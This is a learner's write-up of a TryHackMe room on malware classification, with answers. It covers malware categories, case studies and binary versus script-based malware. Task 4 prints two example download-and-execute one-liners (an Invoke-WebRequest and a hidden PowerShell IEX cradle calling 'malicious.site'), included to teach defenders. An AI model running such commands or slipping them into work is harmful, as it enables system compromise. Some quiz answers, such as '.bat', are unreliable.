<h1 align="center">Malware Classification</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/2cac9f9f-6aff-465c-8662-cbcd01dffa6a"><br>
2025, Spetember 3<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>485</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>Learn how to identify, classify, and understand common types of malware</em>.<br>
Access it <a href="https://tryhackme.com/room/malwareclassification">here</a><br>
<img width="1200px" src=" "></p>

<br>
<h2>Task 1 . Introduction</h2>
<p>Malware refers to software or code created to damage systems, steal information, or allow unauthorised access. It appears in many forms, each with different tactics and goals. Malware can affect businesses in many ways, from financial loss and stolen data to disrupted services and reputational damage. Knowing how malware works is one of the first steps in defending against it.<br>

SOC analysts are responsible for spotting and responding to suspicious activity. They review security alerts and decide what action to take based on the type of threat involved. Classifying malware correctly helps determine the correct response, such as isolating infected machines or investigating data theft. This room introduces the most common malware categories, explains how to tell them apart, and includes real-world examples to support learning.<br>

We'll cover key categories of malware, real-world examples, and the differences between binary and script-based threats.</p>

<h3>Learning Objectives</h3>
<p>

- Learn to classify common malware types based on their behaviour and purpose.<br>
- Understand how real-world malware operates.<br>
- Identify differences between executable and script-based malware.<br>
- Practice classifying malware types.</p>

<h3>Learning Prerequisites</h3>
<p>

- <a href="https://tryhackme.com/room/malmalintroductory">MAL: Malware Introductory</a><br>
- <a href="Intro to Malware Analysis">Intro to Malware Analysis</a></p>

<p><em>Answer the question below</em></p>

<p>1.1.Click to continue learning about different malware types!&nbsp;&nbsp;&nbsp;<code>No answer needed</code></p>

<h2>Task 2 . Malware Types</h2>
<p>Knowing the main types of malware and how they behave helps analysts spot threats quickly. Malware is not just a single thing; it comes in different categories, each with a specific purpose and attack method. By learning to identify these, teams can better respond to incidents and keep their environments safer.</p>

<h3>Malware Categories</h3>
<p>Below is a table summarising the most common malware categories, their main purpose, typical behaviour, and a real-world example for each. Some practical, scenario-based examples follow this to show how these types of malware appear in everyday incidents.</p>

<div align="center"><h6>
  
|<h3>Category</h3><br><br><br>     |<h3>Main<br>Purpose</h3><br><br>    |<h3>Typical<br>Behaviour</h3><br><br>                |<h3>Real-World Example</h3><br><br>|<h3>How this type of malware might appear within an organisation?</h3><br><br>|
|:-------------------------------- |:-----------------------------------|:----------------------------------------------------|:---------------------|:------------------------------------------------------------|
|<code>Adware</code><br><br><br>                |Display unwanted<br>advsertisements<br><br>          |Display unwanted<br>advsertisements<br><br>                     |<a href="https://en.wikipedia.org/wiki/Fireball_(software)">Fireball</a><br><br><br>             |A user’s browser starts showing pop-up ads every few minutes, even when no websites are open. Security tools identify a suspicious program running in the background, which turns out to be adware.|
|<code>Spyware</code><br><br><br><br>           |Colllect information<br>secretly<br><br><br>             |Tracks browsing, records<br>keystrokes, captures data<br><br>   |<a href="https://www.lookout.com/threat-intelligence/article/hermit-spyware-discovery">Hermit</a><br><br><br><br><br>                |An employee notices their personal emails have been accessed by someone else. Forensics show a spyware program on the workstation, which was recording keystrokes and sending the information to an attacker.|
|<code>Ransonware</code><br><br><br><br>            |Extort money by<br>locking files or systems<br><br>  |Encrypts data,<br>displays ransom note<br><br>                  |<a href="https://en.wikipedia.org/wiki/WannaCry_ransomware_attack">WannaCry</a><br><br><br><br>             |Several computers display a ransom note, saying that all files have been encrypted and payment is required to unlock them. The SOC traces the incident to a ransomware attack triggered by a malicious email attachment|
|<code>Wiper</code><br><br><br><br><br>                 |Destroy data<br>or systems<br><br><br><br>                   |Overwrites or deletes<br>files permanently<br><br><br>              |<a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.pathwiper">PathWiper</a><br><br><br><br><br>            |An organisation’s servers suddenly crash, and files are overwritten with random data. Investigation reveals wiper malware designed to destroy data rather than demand a ransom.<br><br><br>|
|<code>C2</code>, Command & Control<br><br><br><br><br>|Enable remote control<br>by and attacker<br><br><br><br>     |Connects to remote server,<br>receives commands<br><br><br>         |<a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-280a">Emotet</a><br><br><br><br><br><br>               |An endpoint is found reaching out to unfamiliar domains at odd hours. Analysts discover C2 malware that gives attackers remote access, allowing them to run commands or move files.<br><br><br><br>|
|<code>Data stealer</code><br><br><br><br>          |Steal sensitive<br>information<br><br><br>               |Exfiltrates files,<br>credentials, or documents<br><br>         |<a href="https://www.eset.com/blog/en/business-topics/threat-landscape/lumma-stealer-threat/">Lumma Stealer</a><br><br><br>       |Sensitive documents start leaking online. The incident response team finds a data stealer malware that collected files from user directories and sent them to an external server.<br><br>|
|<code>Keylogger</code><br><br><br><br>             |Record user<br>keystrokes<br><br> <br>                   |Captures everything<br>typed on keyboard<br><br>                |<a href="https://www.crowdstrike.com/en-us/cybersecurity-101/malware/zeus-malware/">Zeus</a><br><br><br><br>                  |Users report unauthorised transfers from company bank accounts. Analysis shows a keylogger running on the accountant’s computer, recording every keystroke, including passwords.<br><br>|
|<code>Cryptominer</code><br><br><br><br><br>           |Use resources to<br>mine cryptocurrency<br><br><br>      |High CPU usage, slows<br>systems, network traffic<br><br>       |<a href="https://www.checkpoint.com/es/press-releases/february-2019s-most-wanted-malware-coinhive-quits-while-still-at-the-top/">Coinhive</a><br><br><br><br><br>               |Several desktops become slow and fans are running constantly. Monitoring tools reveal high CPU usage linked to a cryptominer that hijacks the computers to mine cryptocurrency.<br><br><br>|

</h6></div><br>

<p><em>Answer the questions below</em><br>
<ol type="1.">
    <li>An employee reports that their system is slow, and monitoring shows constant high CPU usage. What type of malware is most likely responsible?&nbsp;&nbsp;&nbsp;<code>criptominer</code></li>
    <li>Users suddenly lose access to their files, and a message appears demanding cryptocurrency in exchange for unlocking the data. Which malware fits this situation?&nbsp;&nbsp;&nbsp;<code>ransomware</code></li>
    <li>A user’s browser opens pop-up windows even when no site is loaded. No data appears to be stolen or encrypted. What kind of malware is this most likely?&nbsp;&nbsp;&nbsp;<code>adware</code></li>
    <li>Sensitive internal documents are found posted online. Analysis shows the data came from a workstation that had a malicious program. Which malware type does this represent?&nbsp;&nbsp;&nbsp;<code>Data stealer</code></li>
</ol></p>

<h2>Task 3 . Real-World Malware Examples</h2>
<p>Malware is not just a concept found in textbooks. Security teams deal with malware categories like spyware, ransomware, wipers, data stealers, keyloggers, and remote access trojans (RATs) in real incidents. Seeing how each type appears in actual attacks helps contextualise the theory and make the patterns easier to remember. We often refer to malware that relates to or is similar to each other as part of the same malware family.<br>

A malware family refers to a group of malicious programs that share the same origin or codebase and behave similarly. Grouping malware like this helps security teams apply known defences and improve detection and response. Below are short case studies for known malware and links to learn more.</p>

<div align="center"><h6>

|<h3>Malware Type</h3><br> |<h3>Case Study</h3><br><br>                                                                           |<h3>MITRE ATT&CK</h3><br>    |
|:-------------------------------- |:-----------------------------------------------------------------------------------------------------|:--------------------------------|
|<code>Spyware</code><br><br><br><r><br><br><br>|<a href="https://www.group-ib.com/blog/pegasus-spyware/">Pegasus</a> is one of the most well-known spyware tools, used to target mobile phones worldwide. Attackers send a specially crafted message or exploit a vulnerability to install Pegasus silently. Once on a device, it collects text messages, location data, emails, and microphone or camera recordings. Victims range from journalists and politicians to business leaders.<br><br><br>|<code>TA0009</code>, Collection<br><br><code>TA0010</code>, Exfiltration<br><br><br><br>|
|<code>Ransomware</code><br><br><br><r><br><br><br>|<a href="http://trellix.com/blogs/research/akira-ransomware/">Akira</a> is a modern ransomware variant known for targeting businesses, schools, and public services. Attackers use phishing emails, stolen credentials, or remote access software to breach networks. Once inside, Akira spreads, encrypts key files, and displays a ransom note demanding cryptocurrency. This group is known for threatening to leak stolen data if the ransom is not paid.<br><br><br>|<code>TA0040</code>, Impact<br><br><code>TA0011</code>,Command and Control<br><br><br>|
|<code>Wiper</code><br><br><br><r><br><br><br><br>|<a href="https://malwareindepth.com/shamoon-2012/">Shamoon</a> targeted energy companies in the Middle East, most famously Saudi Aramco. The malware rapidly overwrote files with useless data, making systems unusable. Entire networks went offline, and recovery took weeks. Shamoon showed that wipers can cause as much damage as ransomware, but without demanding payment.<br><br><br><br><br>|<code>TA0040</code>, Impact<br><br><br><br><br><br><br>|
|<code>Data Stealer</code><br><br><br><r><br><br><br>|<a href="https://community.netwitness.com/s/article/AgentTesla-TheInformationStealer">Agent Tesla</a> is commonly delivered by phishing emails with attachments. Once opened, it captures keystrokes, screenshots, and credentials from web browsers and email clients. The stolen data is sent to command-and-control servers controlled by the attacker. Agent Tesla has been used in thousands of global attacks and continues to evolve.<br><br><br><br>|<code>TA0010</code>, Exfiltration<br><br><br><br><br><br><br>|
|<code>Keylogger</code><br><br><br><r><br><br><br><br>|<a href="https://www.splunk.com/en_us/blog/security/do-not-cross-the-redline-stealer-detections-and-analysis.html">ReadLine Stealiner</a> RedLine Stealer acts as both a data stealer and a keylogger. It spreads through phishing or malicious websites, then captures keystrokes, browser cookies, and cryptocurrency wallet information. The data is then exfiltrated to the attacker’s server. RedLine is commonly used by cybercriminals for credential theft and fraud.<br><br><br><br><br>|<code>TA0006</code>, Credential Access<br><br><br><code>TA0010</code>, Exfiltration<br><br><br>|
|<code>C2</code> RAT Malware<br><r><br><br><br><br><br><br><br><br>|<a href="https://www.zscaler.com/blogs/security-research/hibernating-qakbot-comprehensive-study-and-depth-campaign-analysis">Qakot</a>, also known as QBot, has become one of the most active and dangerous malware families targeting organisations globally. Originally designed as a banking trojan, QakBot has evolved into a modular RAT used by cybercriminal groups for initial access, credential theft, and as a loader for ransomware like Black Basta. QakBot typically arrives through phishing emails with malicious attachments or links. Once inside a network, it establishes a connection to its command-and-control servers, enabling attackers to move laterally, steal data, or deploy additional malware. In 2023, QakBot was responsible for several high-profile incidents, and law enforcement agencies have issued warnings about its continued activity.<br><br><br><br>|<code>TA0002</code>, Execution<br><br><code>TA0006</code>, Credential Access<br><br><code>TA0011</code>, Command and Control<br><br><br><br>|

</h6></div><br>

<p><em>Answer the questions below</em><br>
<ol type="1.">
    <li>A phishing campaign delivers malware that logs keystrokes, collects screenshots, and sends browser credentials to an external server. Which malware family does it most likely belong to?&nbsp;&nbsp;&nbsp;<code>Agent Tesla</li></code></li>
    <li>An attacker sends a zero-click exploit that silently installs spyware to monitor calls, messages, and device location on a mobile phone. What known malware can be?&nbsp;&nbsp;&nbsp;<code>Pegasus</code></li>
    <li>Which ransomware family is known for stealing data and threatening to leak it if payment is not made?&nbsp;&nbsp;&nbsp;<code>Akira</code></li>
    <li>Which malware targeted energy companies by overwriting files with junk data?<&nbsp;&nbsp;&nbsp;<code>Shamoon</code></li>
</ol></p>

<h2>Task 4 . Binary vs Script Malware</h2>
<p>Malware can arrive in different forms. Two of the most common categories are binary malware (compiled executables) and script-based malware (written in scripting languages). Understanding the difference helps SOC analysts make better decisions when reviewing alerts or suspicious files.<br>

While script-based malware has become popular for its flexibility and ease of modification, executables remain widely used by attackers. They can offer more stability, support complex payloads, and are still effective in environments where security tools are misconfigured or outdated. Both types continue to be seen in real-world intrusions.</p>

<h3>Binary Malware</h3>
<p>Executable-based malware is typically delivered as compiled files such as <strong>.exe</strong> (<strong>Windows Executable</strong> or <strong>.dll</strong> (<strong>Dynamic Link Library</strong>. These files are created from source code and need to be run on a compatible operating system. Common delivery methods for binaries include email attachments (for example, invoice.pdf.exe), malicious downloads, removable media, or as part of another infection. Sometimes, attackers disguise executables by using misleading icons or hiding the real file extension. A way to identify an executable is through a checksum, since executables, once compiled and redistributed, do not change. For example, we can calculate the md5sum of a file and identify the malware regardless of any name or extension change. Each binary may contain hardcoded strings or byte sequences that can serve as unique identifiers. These are commonly used by antivirus and detection engines.</p>

<h3>Script-based Malware</h3>
<p>Script-based malware relies on scripts written in languages such as <strong>JavaScript</strong> (.js), <strong>Visual Basic Script</strong> (.vbs), <strong>Windows batch</strong> (.bat), or <strong>PowerShell</strong> (.ps1). Scripts can be easier for attackers to change and adapt. They often arrive as email attachments, within Office documents containing macros, or through malicious websites. For example, a user might open an email attachment called report.docm, which contains a macro that runs a hidden PowerShell script. Scripts are also popular for initial access, allowing an attacker to run code directly in memory without writing files to disk.</p>

<p>There are some clear warning signs that a script may be acting maliciously:<br>

- The script downloads or runs other files from the internet.<br>
- It makes changes to system settings or disables security tools.<br>
- It runs commands that are not usually part of standard operation, especially with encoded or obfuscated content.<br>
- The script unexpectedly launches other applications, such as PowerShell or CMD.</p>

<p>For example, below we can find an example of an unobfuscated bat script-based malware:<br>
<code>@echo off powershell -Command "Invoke-WebRequest http://malicious.site/payload.exe -OutFile C:\Users\Public\payload.exe" start C:\Users\Public\payload.exe</code></p>

<p>The script above downloads a malware executable and runs it on the victim’s machine. Similarly, we can find a similar example to this one in <strong>PowerShell</strong>:<br>
<code>powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')"</code></p>

<p>The above runs a script from a remote server, often without leaving files behind.</p>

<h3>Script-based Example</h3>
<p>Let's now observe an obfuscated real malware. In this case, this example corresponds to the <strong>LummaStealer</strong>, a popular stealer coded in <strong>C</strong> that is being used as a <strong>MaaS</strong> (malware as a service). This example is from <strong>August 2025</strong>, and it's a sample used to deliver the malware.<br>

As we can observe, there's a lot of data if we scroll down. A function is declared <code>Swvldsp2195</code>, and then a huge variable full of data named <code>qble51</code></p>

<h6 align="center"><img width="700px" src="https://github.com/user-attachments/assets/5d18282a-297c-44db-aff4-78612666becb"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>

<p>Finally, we can observe that, in the end, this data is <strong>base64 decrypted</strong> and executed in memory using a <strong>.NET</strong> assembly (to execute in memory and not disk), as shown below.</p>

<h6 align="center"><img width="700px" src="https://github.com/user-attachments/assets/c98dc318-37c7-4043-affd-561337bd5286"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>

<p>While the above is an easy-to-follow example, more obfuscated script-based malware is very common, and there is a wide variety of these threats. This shows us how threat actors may try to deliver and obfuscate malware within an organisation.</p>

<p><em>Answer the questions below</em><br>
<ol type="1.">
    <li>What command-line tool is frequently used by script-based malware to download payloads?&nbsp;&nbsp;&nbsp;<code>powershell</li></code></li>
    <li>Which file extension is commonly associated with malware and  Windows executables, other than .exe?&nbsp;&nbsp;&nbsp;<code>.bat</code></li>
    <li>Which malware type is more likely to leave identifiable byte patterns used by antivirus software?&nbsp;&nbsp;&nbsp;<code>binary</code></li>
</ol></p>

<h2>Task 5 . Practical</h2>
<p>It’s time to put our knowledge to the test. As a SOC analyst, let’s review some alerts in your dashboard and apply what has been learned.<br>

Click on the View Site button attached to this task to display the static site in split view. Review each alert, and select the correct malware classification to retrieve the flag.<br>

[ View Site ]</p>

<h6 align="center"><img width="700px" src="https://github.com/user-attachments/assets/7b48cc33-889d-4dc2-b6a0-0911d0c7f809"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>

<p>Alternatively, if you can not see all the columns in split view, you can open the static site in full screen by clicking the link below:</p>

<h6 align="center"><img width="20px" src="https://github.com/user-attachments/assets/82efa43c-ffb3-48b8-805b-e3d0847883c8"><br>This image and all the theoretical content of the present article is TryHackMe´s property.</h6>

<p><em>Answer the question below</em><br>
<ol type="1.">
    <li>What is the flag?&nbsp;&nbsp;&nbsp;<code>_________</code><br></li>
</ol></p>

<h2>Task 6 . Conclusion</h2>
<p>Malware continues to be one of the most frequent threats defenders face, and understanding how to classify it helps improve detection and response. Throughout this room, different types of malware were introduced, including how they behave and appear in real-world incidents and how security teams can identify and categorise them. Users learned to distinguish between malware families such as spyware, ransomware, wipers, and keyloggers, and reviewed real case studies to help build intuition. The differences between binary and script-based malware were also covered, along with common delivery methods and indicators of compromise.</p>

<p>Key takeaways:<br>

- Learn how to identify and classify common types of malware.<br>
- Understand how malware behaves and spreads in real-world incidents.<br>
- Distinguish between binary and script-based malware formats.<br>
- Apply classification skills using alert analysis in a simulated SOC environment.</p>

<p><em>Answer the question below</em><br>
<ol type="1.">
    <li>Click to finish your malware classification journey and complete the room.&nbsp;&nbsp;&nbsp;<code>No answer needed</code><br></li>
</ol></p>

<br>
<h2>Completed</h2>


<h2>My TryHackMe Journey</h2>

<div align="left">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| 2025, September 3 | 485      |     111ˢᵗ    |      5ᵗʰ     |     706ᵗʰ   |    14ᵗʰ    | 123,786  |    938    |    73     |

</div>

<p align="left">Global All Time:   111ˢᵗ<br><img width="250px" src="https://github.com/user-attachments/assets/342d3267-7cb7-439d-a38c-c830fcd2505e"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/95107821-91f0-467e-904e-2fc1eb5b641b"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/93be0ca3-5d3d-44de-90c2-4af865af595a"><br>
                  Global monthly:    706ᵗ<br><img width="1200px" src="https://github.com/user-attachments/assets/284fc586-0a95-49c5-8cb8-c7004226e874"><br>
                  Brazil monthly:     14ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/ef2e27d3-0ffa-44d4-b8d8-961064cf27df"><br>

<h2>Thanks for coming!</h2>
<p align="left">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
